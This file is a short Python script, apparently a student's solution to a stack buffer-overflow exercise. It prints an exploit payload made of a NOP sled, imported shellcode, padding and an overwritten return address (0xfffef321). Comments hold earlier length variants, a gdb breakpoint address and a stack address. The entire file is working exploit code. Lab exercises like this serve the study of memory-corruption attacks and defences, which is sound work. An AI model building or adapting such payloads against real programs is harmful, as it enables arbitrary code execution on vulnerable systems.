#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b'\x90'*(1024-50-len(shellcode)) + shellcode + b'\x90'*50 + b'\x90'*4 + pack("<I", 0xfffef321))

# print(len((b'\x90'*512 + shellcode + b'\x90'*(512-len(shellcode)) + b'\x90'*4 + pack("<I", 0xfffef321))))
# print(len((b'\x90'*(1024-50-len(shellcode)) + shellcode + b'\x90'*54 + pack("<I", 0xfffef321))))

# b *0x080488c0
# 0xfffef530